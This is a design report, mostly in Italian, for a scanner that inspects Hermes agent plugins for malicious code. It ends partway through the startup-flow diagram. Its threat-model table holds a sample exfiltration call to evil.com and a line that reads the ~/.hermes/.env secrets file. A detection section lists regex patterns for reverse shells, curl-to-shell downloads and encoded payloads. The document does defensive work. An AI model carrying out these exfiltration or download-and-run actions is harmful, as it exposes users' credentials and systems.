# Hermes Plugin Security Scanner — Strategic Design Report

> **Status:** Strategico (specifiche di implementazione in fase separata)
> **Data:** 2026-06-09
> **Autore:** redoracle
> **Target:** hermes-ops-kit

---

## Indice

1. [Executive Summary](#1-executive-summary)
2. [Threat Model](#2-threat-model)
3. [Architettura: Defense-in-Depth](#3-architettura-defense-in-depth)
4. [Dettaglio Tecnico per Layer](#4-dettaglio-tecnico-per-layer)
5. [SHA Caching Strategy](#5-sha-caching-strategy)
6. [Risk Classification Matrix](#6-risk-classification-matrix)
7. [Plugin Approval & Disable-by-Default Workflow](#7-plugin-approval--disable-by-default-workflow)
8. [External Tools Catalog](#8-external-tools-catalog--riepilogo)
9. [Deep Evaluation: Semgrep as Core SAST Engine](#9-deep-evaluation-semgrep-as-core-sast-engine)
10. [Multi-Option Scan Configuration System](#10-multi-option-scan-configuration-system)
11. [Integrazione con hermes-ops-kit](#11-integrazione-con-hermes-ops-kit)
12. [Flusso Operativo](#12-flusso-operativo)
13. [Limitazioni e False Positives](#13-limitazioni-e-false-positives)
14. [Rollout Strategy](#14-rollout-strategy)
15. [Riferimenti](#15-riferimenti)

---

## 1. Executive Summary

L'ecosistema Hermes conta **60+ plugin open-source** distribuiti su GitHub da sviluppatori individuali e organizzazioni. Il modello di distribuzione è basato su Git: ogni plugin è un repository clonato in `~/.hermes/plugins/` o `~/.hermes/skills/`. Non esiste alcun meccanismo di sicurezza che verifichi il contenuto dei plugin prima dell'esecuzione.

**Minaccia primaria:** Un maintainer malevolo (o un account compromesso) può iniettare codice maligno in un aggiornamento di un plugin legittimo. Il codice viene eseguito con i privilegi dell'agente Hermes, che tipicamente ha accesso a file system, rete, shell, e potenzialmente a secret store e provider API.

**Soluzione proposta:** Uno scanner di sicurezza integrato in hermes-ops-kit, organizzato come
**defense-in-depth** (§3) e implementato operativamente in **6 scan categories componibili** (§10),
con SHA-256 caching per evitare scansioni ripetitive e integrazione _opzionale_ con servizi di
threat intelligence esterni. Lo scanner **riusa** l'infrastruttura esistente (secret scanner,
classifier MCP, policy engine) anziché reimplementarla — vedi §11.4.

### 1.1 Scope: MVP vs Opzionale

Per contenere la complessità, la funzionalità si separa in un nucleo essenziale e in estensioni
opzionali attivabili su richiesta:

| Livello                 | Categorie / componenti                                                                                       | Stato                     |
| ----------------------- | ------------------------------------------------------------------------------------------------------------ | ------------------------- |
| **MVP (Fase 1)**        | `secrets`, `policy`, SHA cache, approval/disable-by-default, integrazione `policy/engine.py`                 | Obbligatorio, 100% locale |
| **Estensione (Fase 2)** | `code` (entropia/offuscamento), `dependencies` (Semgrep Supply Chain), `reputation` via OSSF (senza API key) | Locale o gratuito         |
| **Opzionale (Fase 3)**  | `behavior` (sandbox Docker), `reputation` via VirusTotal/Socket.dev (richiede API key)                       | Disabilitato di default   |

> Le categorie di Fase 2/3 entrano nei _profili_ (§10.3) man mano che vengono implementate:
> finché una categoria non esiste, il profilo che la elenca semplicemente la salta.

### 1.2 Non-Goals (fuori scopo)

- **Non** è un antivirus runtime né un IDS/EDR: scansiona _prima_ dell'esecuzione, non monitora processi in produzione.
- **Non** garantisce rilevazione di malware polimorfico, time/logic bomb o zero-day (vedi §13.1).
- **Non** reimplementa il runtime degli agenti Hermes, il dispatch dei modelli o la gestione delle conversazioni.
- **Non** introduce un nuovo secret store: l'unico backend resta Bitwarden/Vaultwarden.

### 1.3 Allineamento con la lane operativa di ops-kit

Coerentemente con `CLAUDE.md`, lo scanner resta nella **lane operativa** di ops-kit
(sicurezza, policy, orchestrazione) e **integra** i componenti del core Hermes invece di
duplicarli: estende `security/secret_scanner.py`, `mcp/classifier.py` e `policy/engine.py`
(§11.4), e segue i pattern già adottati da `mcp/auditor.py` per l'approval (§7).

---

## 2. Threat Model

### 2.1 Attack Surface

| Superficie                                     | Rischio  | Esempio                                           |
| ---------------------------------------------- | -------- | ------------------------------------------------- |
| `pip install` / `npm install` nei setup script | CRITICAL | `setup.sh` esegue `pip install malicious-package` |
| `subprocess.run()` / `os.system()` offuscato   | CRITICAL | Shell commands nascosti in `__init__.py`          |
| `import` di moduli malevoli                    | CRITICAL | `import evil_module` in codice legittimo          |
| Lettura di file sensibili (`~/.hermes/.env`)   | HIGH     | `open(os.path.expanduser("~/.hermes/.env"))`      |
| Chiamate di rete non dichiarate                | HIGH     | `requests.post("https://evil.com/exfil")`         |
| Prompt injection nei SKILL.md                  | MEDIUM   | Istruzioni nascoste nei markdown dei plugin       |
| Dipendenze NPM/PyPI vulnerabili                | MEDIUM   | `package.json` con versione nota vulnerabile      |
| Esecuzione post-install (hook npm, setup.py)   | CRITICAL | Codice eseguito automaticamente al `pip install`  |

### 2.2 Attacker Profiles

1. **Supply Chain Compromise** — Un hacker prende il controllo di un repo legittimo (credential leak, token GitHub compromesso) e pubblica un aggiornamento malevolo.
2. **Typosquatting** — Un plugin con nome simile a uno popolare (es. `hermes-plugins` vs `hermes-pluggin`) contenente malware.
3. **Malicious Maintainer** — Un plugin creato intenzionalmente malevolo fin dall'inizio, mascherato da utility innocua.
4. **Dependency Poisoning** — Il plugin è pulito, ma una sua dipendenza (npm/PyPI) è compromessa.

### 2.3 Trust Boundaries

```text
┌─────────────────────────────────────────────────┐
│                 TRUSTED ZONE                     │
│  ~/.hermes/.env  │  Bitwarden  │  API Keys      │
└──────────────────┬──────────────────────────────┘
                   │  PLUGIN CODE EXECUTES HERE
                   │  (should be untrusted)
┌──────────────────┴──────────────────────────────┐
│              UNTRUSTED ZONE                      │
│  ~/.hermes/plugins/*  │  ~/.hermes/skills/*     │
└─────────────────────────────────────────────────┘
```

I plugin vengono eseguiti **all'interno della Trusted Zone** — è questa la ragione per cui lo scanning è critico.

---

## 3. Architettura: Defense-in-Depth

```text
Plugin Install / Update
        │
        ▼
┌──────────────────────────────────────┐
│ L0: SHA-256 Cache Lookup             │  0ms
│     Hash già visto e pulito? → Skip  │
└────────────┬─────────────────────────┘
             │ nuovo/aggiornato
             ▼
┌──────────────────────────────────────┐
│ L1: Static Pattern Matching          │  <1s
│     Regex secrets, AST import scan   │
└────────────┬─────────────────────────┘
             │ pass
             ▼
┌──────────────────────────────────────┐
│ L2: Obfuscation & Entropy Analysis    │  1-3s
│     Entropia, code density, minifier  │
└────────────┬─────────────────────────┘
             │ pass
             ▼
┌──────────────────────────────────────┐
│ L3: Sandbox Dry-Run Execution        │  5-30s
│     Container o seccomp, monitor I/O │
└────────────┬─────────────────────────┘
             │ pass
             ▼
┌──────────────────────────────────────┐
│ L4: External Threat Intelligence     │  API roundtrip
│     VirusTotal, OSSF Scorecard, etc  │
└────────────┬─────────────────────────┘
             │ pass
             ▼
        ✅ PLUGIN CLEAN
      (SHA-256 salvato in cache)
```

### 3.1 Dai layer alle categorie (modello canonico)

Il diagramma sopra è la **cornice concettuale** (defense-in-depth). L'**unità operativa
canonica** — su cui si basano configurazione, CLI e scoring — sono le **6 scan categories**
del §10. La corrispondenza è 1:N e va letta così:

| Layer concettuale            | Scan category (§10)  | Note                                           |
| ---------------------------- | -------------------- | ---------------------------------------------- |
| L0 — Cache                   | _(ortogonale)_       | SHA-256 cache, vedi §5                         |
| L1 — Static pattern matching | `secrets` + `policy` | Locale, gratuito                               |
| L2 — Obfuscation & entropy   | `code`               | Locale, gratuito                               |
| L3 — Sandbox dry-run         | `behavior`           | **Opzionale**, disabilitato di default         |
| L4 — Threat intelligence     | `reputation`         | OSSF gratuito; VirusTotal/Socket.dev opzionali |
| L1 + L4 (dipendenze)         | `dependencies`       | Lock file → Advisory DB                        |

Principi che ne derivano:

- **Locale prima di tutto:** `secrets`, `policy`, `code` e `dependencies` sono 100% offline e
  bloccano la grande maggioranza dei plugin malevoli senza alcuna chiamata API.
- **Categorie indipendenti e componibili:** ognuna è attivabile/disattivabile e raggruppabile in
  _profili_ per contesto (§10.3).
- **Le parti costose sono opzionali:** `behavior` (sandbox) e i tool a chiave API di `reputation`
  sono disabilitati di default per non gravare su avvio/CI.

---

## 4. Dettaglio Tecnico per Layer

> **Nota:** questa sezione è il _dettaglio tecnico_ di ciascun layer concettuale (L0–L4).
> L'unità operativa effettiva resta la **scan category** (§10), secondo la mappatura del §3.1;
> il caching L0 è approfondito nel §5.

### 4.1 L0 — SHA-256 Caching

**Obiettivo:** Evitare scansioni ripetitive di plugin già verificati.

**Implementazione:**

- Database SQLite in `~/.hermes/ops-kit/plugin_scanner_cache.db`
- Tabella: `(plugin_path, git_commit_hash, file_tree_sha, scan_result, scan_date, scanner_version)`
- **Due livelli di hash:**
  - `git_commit_hash` — cattura aggiornamenti del repo
  - `file_tree_sha` — cattura modifiche locali non committate (sicurezza aggiuntiva)

**Cache invalidation:**

- Nuovo commit → rescan automatico
- File modificati localmente → rescan automatico
- Scanner aggiornato (nuova versione) → rescan di tutti i plugin
- TTL configurabile (default: 7 giorni) — forzatura periodica

**Schema tabella:**

```sql
CREATE TABLE plugin_scans (
    plugin_name     TEXT PRIMARY KEY,
    plugin_path     TEXT NOT NULL,
    git_remote      TEXT,
    git_commit_hash TEXT,
    file_tree_sha   TEXT,
    scan_result     TEXT NOT NULL,  -- 'clean', 'warning', 'blocked'
    risk_level      TEXT,           -- 'none', 'low', 'medium', 'high', 'critical'
    findings        JSON,           -- [{layer, rule, detail}]
    scanner_version TEXT,
    scanned_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at      TIMESTAMP
);
```

### 4.2 L1 — Static Pattern Matching

**Obiettivo:** Identificare pattern di codice malevolo senza eseguire nulla.

#### 4.2.1 Regex Patterns (basato su `security/redaction.py` + `security/secret_scanner.py` esistenti)

Estendere `SECRET_PATTERNS` con pattern specifici per plugin:

| Categoria            | Pattern                                                              | Rischio  |
| -------------------- | -------------------------------------------------------------------- | -------- | ------------- | -------- |
| Secrets in chiaro    | `sk-[a-zA-Z0-9]{20,}`, `AIza[0-9A-Za-z_-]{30,}`                      | CRITICAL |
| Shell execution      | `os\.system\s*\(`, `subprocess\.(call                                | run      | Popen)\s\*\(` | CRITICAL |
| Reverse shell        | `socket\.socket\s*\(.*AF_INET`, `pty\.spawn\s*\(`                    | CRITICAL |
| File exfiltration    | `shutil\.copy\s*\(.*\.env`, `open\(.*\.hermes`                       | HIGH     |
| Network exfil        | `requests\.post\s*\(.*http`, `urllib\.request` verso URL sconosciuti | HIGH     |
| Dynamic import       | `__import__\s*\(`, `exec\s*\(`, `eval\s*\(`, `compile\s*\(`          | HIGH     |
| Encoded payloads     | `base64\.b64decode\s*\(`, `zlib\.decompress\s*\(`                    | MEDIUM   |
| Pip install nascosto | `pip\s+install`, `npm\s+install\s+-g`, `curl.*\|.*sh`                | CRITICAL |
| Cron/scheduled       | `crontab\s`, `schtasks`, `launchd`                                   | MEDIUM   |
| Download + exec      | `wget.*\|.*sh`, `curl.*\|.*bash`, `Invoke-Expression`                | CRITICAL |

#### 4.2.2 AST-Based Import Analysis (Python)

Invece di semplici regex, usare `ast` per walkare l'AST dei file Python:

```python
import ast

class PluginImportAnalyzer(ast.NodeVisitor):
    DANGEROUS_IMPORTS = {
        'subprocess', 'os', 'socket', 'ctypes', 'multiprocessing',
        'pickle', 'marshal', 'code', 'builtins',
    }
    SUSPICIOUS_IMPORTS = {
        'requests', 'urllib', 'http.client', 'ftplib',
        'shutil', 'pathlib',
    }

    def visit_Import(self, node):
        # Check import x, import x.y
        ...

    def visit_ImportFrom(self, node):
        # Check from x import y
        ...
```

#### 4.2.3 JavaScript/TypeScript Scanning (per plugin Node.js)

Molti plugin Hermes usano Node.js/TypeScript (MCP server, skill). Servono scanner paralleli:

- **eslint-plugin-security** — regole per pattern pericolosi in JS/TS
- **npm audit** — vulnerabilità note nelle dipendenze
- **Regex JS-specifici:** `child_process`, `execSync`, `spawn`, `fetch(` verso URL dinamici

#### 4.2.4 SKILL.md / Markdown Scanning

I plugin spesso contengono file `SKILL.md` con istruzioni che vengono eseguite dall'agente. Lo scanner deve:

- Cercare **prompt injection** (riutilizzare `INJECTION_PATTERNS` da `mcp/classifier.py`)
- Identificare comandi shell in blocchi codice markdown
- Verificare URL/endpoint sospetti nei link

### 4.3 L2 — Obfuscation & Entropy Analysis

> **Stato v0.2.0:** L'entropia di Shannon è stata implementata per la detection
> di segreti fake (chiavi con entropia <3.2 bits/char vengono declassate).
> L'analisi di offuscamento del codice (entropia >6.0 per file interi) resta
> pianificata per la Fase 2.

**Obiettivo:** Rilevare codice intenzionalmente offuscato e distinguere segreti reali da test fixtures.

#### 4.3.1 Shannon Entropy Scoring (parzialmente implementato)

Calcolare l'entropia di Shannon per ogni file. L'entropia di codice normale è 4.0-5.5 bits/byte. Valori >6.0 indicano offuscamento o encoding.

```text
Entropy Score  │  Significato
───────────────┼─────────────────────────────
  4.0 - 5.5   │  Codice normale (Python, JS, YAML)
  5.5 - 6.0   │  Sospetto (possibile minification)
  6.0 - 7.0   │  Probabile offuscamento / base64
  7.0+         │  Quasi certo encoding/encryption
```

#### 4.3.2 AST Density Analysis

Misurare il rapporto tra nodi AST e linee di codice. Codice offuscato tende ad avere:

- Alta densità di string literals
- Pochi nome variabile descrittivi (single-char names)
- Molte chiamate di funzione annidate

#### 4.3.3 Strumenti Esterni Utilizzabili

| Tool                                                        | Linguaggio    | Cosa fa                                                                               |
| ----------------------------------------------------------- | ------------- | ------------------------------------------------------------------------------------- |
| [Semgrep](https://semgrep.dev)                              | Multi         | SAST con regole comunitarie. 2,500+ regole predefinite. Gratuito, offline.            |
| [Bandit](https://bandit.readthedocs.io)                     | Python        | AST-based security linter. Trova SQL injection, shell injection, hardcoded passwords. |
| [ESLint](https://eslint.org) + security plugin              | JavaScript/TS | Regole per `eval`, `child_process`, `Function()` constructor.                         |
| [detect-secrets](https://github.com/Yelp/detect-secrets)    | Multi         | Yelp's secret scanner, plugin-based, alta precisione.                                 |
| [truffleHog](https://github.com/trufflesecurity/trufflehog) | Multi         | Trova secrets nei repo Git e nel codice. Verifica entropia + regex.                   |
| [gitleaks](https://github.com/gitleaks/gitleaks)            | Multi         | SAST per secrets in repo Git. Pre-commit hook + scan history.                         |

### 4.4 L3 — Sandbox Dry-Run Execution

**Obiettivo:** Osservare il comportamento runtime del plugin senza permettergli di fare danni.

#### 4.4.1 Approcci di Sandboxing

| Approccio                 | Isolamento | Overhead      | Note                                            |
| ------------------------- | ---------- | ------------- | ----------------------------------------------- |
| **Docker container**      | Eccellente | ~2-5s startup | `--read-only`, `--network=none`, `--tmpfs /tmp` |
| **Firejail**              | Buono      | ~0.5s         | Linux only, seccomp + namespace                 |
| **gVisor (runsc)**        | Eccellente | ~1s           | User-space kernel, intercetta syscall           |
| **Python subinterpreter** | Medio      | ~0.1s         | `multiprocessing` con resource limits           |
| **NSJAIL**                | Eccellente | ~0.3s         | Google's sandbox, usato in CTF                  |

**Raccomandazione:** Docker container con profile hardened:

```bash
docker run --rm \
  --read-only \
  --network=none \
  --memory=256m \
  --cpus=0.5 \
  --tmpfs /tmp:noexec \
  --security-opt=no-new-privileges \
  --cap-drop=ALL \
  -v /tmp/plugin:/plugin:ro \
  scanner-image python3 -c "import plugin; ..."
```

#### 4.4.2 Cosa Monitorare nel Dry-Run

- **Network activity** — Tentativi di connessione (con `--network=none`, qualsiasi tentativo è sospetto)
- **File system writes** — Tentativi di scrittura fuori da `/tmp`
- **Process spawning** — `fork()`, `exec()`, `clone()`
- **Env var access** — Tentativi di leggere `HOME`, `HERMES_*`, `BW_*`
- **Import side effects** — Cosa succede al `import` del modulo

#### 4.4.3 Timeout e Risorse

- Timeout massimo: 30 secondi per plugin
- Memoria max: 256MB
- Se il plugin richiede più risorse → flaggato per review manuale

### 4.5 L4 — External Threat Intelligence

**Obiettivo:** Sfruttare database di threat intelligence per reputazione repo e file.

#### 4.5.1 VirusTotal API v3

- **Endpoint:** `POST /api/v3/files` (upload file) o `GET /api/v3/files/{hash}` (lookup by hash)
- **Costo:** Free tier: 500 lookups/day, 4 requests/minute
- **Rate limit:** Richiede API key (gratuita, registrazione su virustotal.com)

**Utilizzo consigliato:**

- Inviare solo SHA-256 degli archivi, non i file interi (lookup by hash)
- Inviare file solo se hash non trovato (consuma quota)
- Cachare i risultati per 30 giorni

#### 4.5.2 OSSF Scorecard

- **Endpoint:** `GET /repos/{owner}/{repo}` via GitHub API + Scorecard action data
- **Costo:** Gratuito (usa GitHub API)
- **Cosa misura:** Vulnerabilità note, CI/CD best practices, manutenzione, code review, signed releases

**Utilizzo consigliato:**

- Eseguire per ogni plugin repo al momento dell'installazione
- Score minimo accettabile: 5.0/10
- Flag bassi: `Code-Review=0`, `Signed-Releases=False`, `Vulnerabilities=True`

#### 4.5.3 Altri Servizi Utilizzabili

| Servizio                                            | Tipo             | Cosa offre                                             | Costo                       |
| --------------------------------------------------- | ---------------- | ------------------------------------------------------ | --------------------------- |
| [Socket.dev](https://socket.dev)                    | Supply chain     | Analisi npm/PyPI: malware, typo-squatting, native code | Free tier: 100 scans/month  |
| [Snyk](https://snyk.io)                             | Vulnerability DB | Vulnerabilità note, fix advice, SBOM                   | Free tier: 200 tests/month  |
| [PyPI Security](https://pypi.org)                   | Package registry | Verifica integrità pacchetti, hash confronto           | Gratuito                    |
| [GitHub Advisory DB](https://github.com/advisories) | CVE Database     | Query per CVE in dipendenze                            | Gratuito, API GraphQL       |
| [AbuseIPDB](https://abuseipdb.com)                  | IP Reputation    | Verifica se IP/domini contattati sono malevoli         | Free tier: 1000 lookups/day |
| [URLScan.io](https://urlscan.io)                    | URL Analysis     | Sandbox per URL, screenshot, redirect chain            | Free tier: limitato         |
| [AlienVault OTX](https://otx.alienvault.com)        | Threat Intel     | Indicatori di compromissione, community-driven         | Gratuito                    |

---

## 5. SHA Caching Strategy

### 5.1 Due Livelli di Hash

```text
Plugin Version Identity = SHA256(git_commit_hash + file_tree_merkle_root)

git_commit_hash  →  git rev-parse HEAD           (cambia ad ogni commit)
file_tree_sha    →  SHA256(sorted_file_hashes)    (cambia a modifiche locali)
```

### 5.2 Merkle Tree per File Tree

Invece di un singolo hash di tutti i file, usare un Merkle tree per identificare quali file sono cambiati:

```text
                    ROOT = H(H0 + H1)
                   /                \
            H0 = H(F0+F1)      H1 = H(F2+F3)
           /          \        /          \
        H(f0)       H(f1)   H(f2)       H(f3)
```

**Vantaggio:** Se solo `config.yaml` cambia, possiamo ri-scansionare solo quel file, non l'intero plugin.

### 5.3 Cache Flow

```text
Plugin loaded
    │
    ▼
Compute git_commit_hash + file_tree_sha
    │
    ▼
Lookup in SQLite cache ───── match + valid TTL ──▶ ✅ Skip scan
    │
    │ no match / expired
    ▼
Run L1 → L2 → L3 → L4 (configurable)
    │
    ▼
Store result in cache with new hashes
```

### 5.4 Forced Rescan Triggers

- **Scanner version bump** — Se la versione dello scanner cambia, tutti i plugin vengono ri-scansionati (le regole potrebbero essere migliorate)
- **Manual trigger** — `hermes-ops-kit plugin scan --force --plugin <name>`
- **Config change** — Se l'utente abilita un nuovo layer (es. L4), rescan di tutto
- **TTL expiry** — Default 7 giorni, configurabile

---

## 6. Risk Classification Matrix

Riprendendo e estendendo il sistema esistente in `mcp/classifier.py`:

| Risk Level   | Criteri                                                                   | Azione Automatica                     |
| ------------ | ------------------------------------------------------------------------- | ------------------------------------- |
| **CRITICAL** | Secret in chiaro, reverse shell, `os.system` offuscato, import malevoli   | **BLOCK** — Plugin non caricato       |
| **HIGH**     | `exec()`/`eval()` dinamici, network exfil, file system write sospetti     | **DISABLE** — Richiede approval esplicita |
| **MEDIUM**   | Codice offuscato (entropia >6.0), import sospetti, dipendenze vulnerabili | **DISABLE** — Richiede approval esplicita |
| **LOW**      | Pattern minori, best practice non seguite                                 | **INFO** — Solo notifica              |
| **NONE**     | Plugin pulito, tutti i layer passati                                      | **ALLOW** — Caricamento normale       |

### 6.1 Estensione del Policy Engine Esistente

Il nuovo scanner si integra con `policy/engine.py`:

```python
# policy/rules.yaml (estensione)
rules:
  plugin_security:
    deny_if:
      - risk_level_critical
      - unsigned_plugin
      - unknown_remote
    require_approval_for:
      - risk_level_high
      - first_time_install
      - remote_changed
    allow:
      - risk_level_low
      - risk_level_none
```

---

## 7. Plugin Approval & Disable-by-Default Workflow

> **Pattern:** Questo sistema **estende** il modello di approval MCP esistente
> in `mcp/auditor.py` (atomic server approval, wildcard tool matching, policy JSON
> con `os.replace`), aggiungendo _deliberatamente_ due livelli più fini — per-finding
> e per-categoria — utili a uno scanner. I plugin ereditano lo stesso flusso:
> scan → risk classify → approval decision → enable/disable.

### 7.1 Principio Fondamentale: Disable-by-Default

Ogni plugin con rischio **medium o superiore** viene **disabilitato di default**
finché l'utente non lo approva esplicitamente. Questo è il principio di sicurezza
centrale: nessun plugin potenzialmente pericoloso viene mai eseguito senza
consenso informato.

```text
Plugin Installato / Aggiornato
        │
        ▼
   Security Scan (profili §10.3)
        │
        ├── risk = NONE o LOW ────────▶ ✅ ENABLED (auto)
        │
        ├── risk = MEDIUM ─────────────▶ ⚠️ DISABLED (richiede approval)
        │                                    L'utente vede i findings e decide
        │
        ├── risk = HIGH ───────────────▶ 🚫 DISABLED (richiede approval + warning)
        │                                    L'utente deve confermare esplicitamente
        │
        └── risk = CRITICAL ───────────▶ ⛔ BLOCKED (approval non possibile)
                                             Solo override manuale via config file
```

### 7.2 Plugin Policy Structure

Riprendendo il pattern di `mcp/auditor.py` (`_MCP_POLICY_PATH`, `_load_mcp_policy`,
`_save_mcp_policy`, `_is_approved`), la policy dei plugin estende lo stesso formato
(liste di nomi + wildcard `_*`) con due liste aggiuntive — `approved_findings` e
`approved_categories`. **Lo stato corrente vive solo qui**; la cronologia delle
decisioni è demandata all'audit trail JSONL (§7.9), per non duplicarla.

**File:** `~/.hermes/ops-kit/plugin_policy.json`

```json
{
  "version": 1,
  "approved_plugins": ["hermes-plugins", "hermes-workspace"],
  "approved_findings": [
    "hermes-plugins:network-access:requests_to_api.example.com",
    "hermes-skill-factory:dynamic-import:importlib.import_module",
    "mcp_*:secrets:false_positive_regex_match"
  ],
  "approved_categories": ["hermes-dojo:code"],
  "disabled_plugins": ["hermes-payguard", "ripley-xmr-gateway"],
  "blocked_plugins": []
}
```

### 7.3 Approval Matching Logic

Estende `_is_approved()` del MCP auditor con i livelli finding/categoria, mantenendo
**lo stesso wildcard inline** dell'originale (`entry.endswith("_*")` + `startswith`),
così non serve alcun helper aggiuntivo:

```python
# Pattern (non implementazione — segue mcp/auditor.py:_is_approved)

def _is_plugin_approved(plugin_name: str, finding_id: str,
                        category: str, policy: dict) -> tuple[bool, str]:
    """Check if a plugin or finding is approved.

    Returns (is_approved, match_reason).
    Priority: plugin-level > finding > category > wildcard.
    """
    # 1. Plugin-level: tutto il plugin è approvato (tutti i findings ignorati)
    if plugin_name in policy.get("approved_plugins", []):
        return True, "plugin_approved"

    # 2. Esplicitamente bloccato
    if plugin_name in policy.get("blocked_plugins", []):
        return False, "plugin_blocked"

    # 3. Esplicitamente disabilitato (l'utente ha visto e scelto di non approvare)
    if plugin_name in policy.get("disabled_plugins", []):
        return False, "plugin_disabled"

    # 4. Finding specifico approvato
    if finding_id in policy.get("approved_findings", []):
        return True, "finding_approved"

    # 5. Categoria approvata per questo plugin
    plugin_category = f"{plugin_name}:{category}"
    if plugin_category in policy.get("approved_categories", []):
        return True, "category_approved"

    # 6. Wildcard finding — stesso meccanismo inline di mcp/auditor.py:_is_approved
    #    (suffisso "_*" + startswith): "mcp_*" approva tutti i findings dei plugin MCP.
    for entry in policy.get("approved_findings", []):
        if entry.endswith("_*") and finding_id.startswith(entry[:-2]):
            return True, "wildcard_finding"

    return False, "not_approved"
```

### 7.4 Livelli di Approval

| Livello       | Comando                                                        | Effetto                                                         |
| ------------- | -------------------------------------------------------------- | --------------------------------------------------------------- |
| **Plugin**    | `plugin approve hermes-plugins`                                | Approva TUTTI i findings presenti e futuri del plugin           |
| **Finding**   | `plugin approve --finding "hermes-plugins:network-access:..."` | Approva un singolo finding specifico                            |
| **Categoria** | `plugin approve hermes-plugins --category code`                | Approva tutti i findings della categoria `code` per quel plugin |
| **Globale**   | `plugin approve --all`                                         | Approva tutti i plugin attualmente installati (atomico)         |
| **Wildcard**  | `plugin approve --finding "mcp_*:secrets:*"`                   | Approva pattern via wildcard                                    |

### 7.5 CLI Commands per Approval

Riprendendo la UX di `mcp approve --server`, `mcp approve --all`, `mcp revoke`:

```bash
# ─── Approval ───

# Approva un plugin intero (atomico: tutti i suoi findings)
hermes-ops-kit plugin approve hermes-plugins
hermes-ops-kit plugin approve hermes-plugins --notes "Network access legittimo"   # la nota finisce nel JSONL (§7.9)

# Approva un finding specifico
hermes-ops-kit plugin approve --finding "hermes-plugins:network-access:github_api"

# Approva tutti i findings di una categoria per un plugin
hermes-ops-kit plugin approve hermes-plugins --category code

# Approva tutti i plugin attualmente installati (atomico, come mcp approve --all)
hermes-ops-kit plugin approve --all
hermes-ops-kit plugin approve --all --dry-run    # Preview senza applicare

# ─── Revoca ───

# Revoca approvazione di un plugin (torna disabled)
hermes-ops-kit plugin revoke hermes-plugins

# Revoca un finding specifico
hermes-ops-kit plugin revoke --finding "hermes-plugins:network-access:github_api"

# Revoca tutte le approvazioni (come mcp revoke)
hermes-ops-kit plugin revoke --all
hermes-ops-kit plugin revoke --all --dry-run

# ─── Disable / Enable ───

# Disabilita esplicitamente un plugin (anche se low risk)
hermes-ops-kit plugin disable hermes-payguard

# Riabilita un plugin precedentemente disabilitato
hermes-ops-kit plugin enable hermes-payguard

# ─── Policy ───

# Mostra policy corrente
hermes-ops-kit plugin policy
hermes-ops-kit plugin policy --json

# Esporta policy per backup
hermes-ops-kit plugin policy export > plugin_policy_backup.json

# Importa policy da backup
hermes-ops-kit plugin policy import plugin_policy_backup.json
```

### 7.6 Interactive Approval Flow (Terminale)

Quando lo scanner trova un plugin con rischio medium+ **non ancora approvato**,
l'utente viene interpellato interattivamente:

```text
┌─────────────────────────────────────────────────────────────┐
│ 🔍 Plugin Security Scan — hermes-payguard                   │
├─────────────────────────────────────────────────────────────┤
│ Risk Level: HIGH                                            │
│ Status:     ⚠️  DISABLED (requires approval)                │
│                                                             │
│ Findings (3):                                               │
│   🔴 shell-execution — os.system() in payguard/setup.sh:12  │
│   🟡 network-access  — requests.post() to 198.51.100.23     │
│   🟡 env-access      — os.environ.get("BW_SESSION")         │
│                                                             │
│ Plugin will remain DISABLED until approved.                 │
├─────────────────────────────────────────────────────────────┤
│ What would you like to do?                                  │
│                                                             │
│  [A] Approve plugin (all findings, plugin enabled)          │
│  [F] Approve specific findings (choose which)               │
│  [D] Keep disabled (default — plugin stays off)             │
│  [B] Block permanently (never ask again)                    │
│  [I] Inspect findings in detail                             │
│  [S] Skip for now (ask again next scan)                     │
│                                                             │
│  Choice [D]:                                                │
└─────────────────────────────────────────────────────────────┘
```

### 7.7 Non-Interactive Mode (CI / Headless)

Per ambienti headless (server, CI/CD, cron), tutte le decisioni sono pre-determinate
dalla policy. Non c'è prompt interattivo:

```yaml
# ~/.hermes/ops-kit/plugin_scanner.yaml

approval:
  mode: auto # auto | interactive | strict

  auto:
    # In modalità auto, decisioni basate su risk level
    risk_none: allow
    risk_low: allow
    risk_medium: disable # Disabilita automaticamente, notifica
    risk_high: disable # Disabilita automaticamente, alert
    risk_critical: block # Blocco immediato, no possibilità di override auto

  interactive:
    # In modalità interactive (default), l'utente decide caso per caso
    prompt_on: [medium, high]
    auto_block: [critical]

  strict:
    # In modalità strict, nessun plugin con risk > low viene caricato
    allow_max_risk: low
    deny_on_unknown: true
```

### 7.8 Persistenza e Atomicità

Seguendo il pattern di `mcp/auditor.py:_save_mcp_policy`:

```python
# Pattern (non implementazione — segue mcp/auditor.py)
import json, os

PLUGIN_POLICY_PATH = os.path.expanduser("~/.hermes/ops-kit/plugin_policy.json")

def _save_plugin_policy(policy: dict) -> None:
    """Atomic write della policy (tmp + os.replace)."""
    tmp = PLUGIN_POLICY_PATH + ".tmp"
    with open(tmp, "w") as f:
        json.dump(policy, f, indent=2, sort_keys=True)
    os.replace(tmp, PLUGIN_POLICY_PATH)  # Atomico su POSIX

    # Best-effort sync a config.yaml (come MCP auditor)
    config_path = os.path.expanduser("~/.hermes/config.yaml")
    if os.path.exists(config_path):
        try:
            import yaml
            with open(config_path) as f:
                cfg = yaml.safe_load(f) or {}
            cfg["plugin_policy"] = policy
            with open(config_path + ".tmp", "w") as f:
                yaml.dump(cfg, f, default_flow_style=False, allow_unicode=True)
            os.replace(config_path + ".tmp", config_path)
        except Exception:
            pass  # JSON is authoritative
```

### 7.9 Decision History & Audit Trail

Ogni decisione di approval/revoke/disable viene registrata in un audit trail
JSONL, coerentemente con il pattern `audit/audit_log.py` esistente:

```jsonl
{"ts":"2026-06-09T15:30:00Z","action":"plugin_approved","plugin":"hermes-plugins","risk":"medium","findings":3,"by":"user"}
{"ts":"2026-06-09T15:31:12Z","action":"plugin_disabled","plugin":"hermes-payguard","risk":"high","reason":"shell_exec + unknown_network","by":"auto"}
{"ts":"2026-06-09T15:32:00Z","action":"finding_approved","plugin":"hermes-skill-factory","finding":"hermes-skill-factory:dynamic-import:importlib","by":"user"}
{"ts":"2026-06-09T15:33:00Z","action":"plugin_revoked","plugin":"hermes-plugins","by":"user"}
{"ts":"2026-06-09T16:00:00Z","action":"policy_exported","entries":42,"by":"user"}
```

### 7.10 Integrazione con il Flusso di Avvio

```text
Hermes Startup
    │
    ▼
Hook: plugin_security_scan (profile: startup)
    │
    ▼
Per ogni plugin installato:
    │
    ├── Cache hit + approved → ✅ ENABLED (skip)
    │
    ├── Cache hit + NOT approved → ⚠️ DISABLED (era già stato disabilitato)
    │
    ├── Cache miss → scan
    │       │
    │       ├── risk = none/low → auto-approve → ✅ ENABLED
    │       │
